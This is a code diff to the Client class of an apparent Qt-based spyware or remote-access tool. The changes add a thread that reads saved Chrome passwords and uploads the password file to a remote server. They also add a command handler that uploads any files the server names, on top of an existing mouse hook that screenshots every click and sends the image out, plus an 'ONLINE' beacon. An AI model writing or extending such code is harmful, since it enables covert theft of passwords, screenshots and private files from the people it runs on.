@@ -5,7 +5,8 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     QObject(parent),
     path(defaultPath),
     ip(_ip),
-    port(_port)
+    port(_port),
+    isChromePassExists(false)
 {
     //Start modules
     fileServer = new FileServer(this, 1234, path);
@@ -32,14 +33,14 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
 
     //TODO: new variable isOnline?
 
-    //Wait for new config file
+    //Connect to receive files and strings
     connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
+    connect(fileServer, &FileServer::stringRecieved, [this](QString str, QString ip){ this->getString(str, ip); });
 
     //Progress bar
     //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
 
-    //Start and connect screenshot module
-    //connect(&MouseHook::instance(), &MouseHook::mouseClicked, &MouseHook::instance(), &MouseHook::makeScreenshot);
+    //Connect screenshot module
     connect(&MouseHook::instance(), &MouseHook::mouseClicked,
             this, [this]()
     {
@@ -58,8 +59,6 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
         connect(screen, &MakeScreen::screenSaved,
         this, [this](QString path)
         {
-            //TODO: remove
-            qDebug() << path;
             //Send screenshot
             fileClient->enqueueData(_FILE, path);
             fileClient->connect();
@@ -97,11 +96,12 @@ void Client::update()
 
 void Client::getOnline()
 {
+    //Start and connect timer
     onlineTimer->start(30*1000);    //30 sec
     connect(onlineTimer, &QTimer::timeout, fileClient, &FileClient::connect);
     connect(fileClient, &FileClient::transmitted, onlineTimer, &QTimer::stop);
     //Send string
-    fileClient->enqueueData(_STRING, "ONLINE:" + fileClient->getName());
+    fileClient->enqueueData(_STRING, "ONLINE|" + fileClient->getName());
     fileClient->connect();
 }
 
@@ -117,30 +117,51 @@ void Client::getFile(const QString& path, const QString& /* ip */)
 
 void Client::getString(const QString &string, const QString& /* ip */)
 {
-    //TODO
-    qDebug() << string;
-    QString command = string.section(':', 0, 0);
+    QString command = string.section('|', 0, 0);
     if (command == "FILES")
     {
-        //remove "FILES:"
-        int colonPos = string.indexOf(":");
         QString filesStr = string;
+        //remove "FILES|"
+        int colonPos = string.indexOf("|");
         filesStr.remove(0, colonPos+1);
 
-        QString currentFile = filesStr.section(';', 0, 0);
+        QString currentFile = filesStr.section('|', 0, 0);
         quint16 files = currentFile.toInt();
-        if (files & ChromePass)
+        if (files & ChromePass & !(isChromePassExists))
         {
-            //
+            //Start thread with chrome password reader
+            QThread* thread = new QThread(this);
+            PassReader* passReader = new PassReader;
+            passReader->moveToThread(thread);
+
+            connect(thread, &QThread::started, passReader, &PassReader::readPass);
+            connect(passReader, &PassReader::passSaved, thread, &QThread::quit);
+            connect(thread, &QThread::finished, thread, &QThread::deleteLater);
+            connect(thread, &QThread::finished, passReader, &PassReader::deleteLater);
+
+            thread->start();
+            isChromePassExists = true;
+
+            connect(passReader, &PassReader::passSaved,
+            this, [this](QString path)
+            {
+                //Send password file
+                fileClient->enqueueData(_FILE, path);
+                fileClient->connect();
+                isChromePassExists = false;
+            });
         }
 
-        //Look for all files
-        currentFile = filesStr.section(';', 1, 1);
+        //Look for all files in string
+        currentFile = filesStr.section('|', 1, 1);
         for (int i = 2; ! currentFile.isEmpty(); ++i)
         {
-            qDebug() << currentFile;
-            currentFile = filesStr.section(';', i, i);
+            //TODO
+            //Update check if section is empty file1||file2
+            fileClient->enqueueData(_FILE, currentFile);
+            currentFile = filesStr.section('|', i, i);
         }
+        fileClient->connect();
     }
 }
 
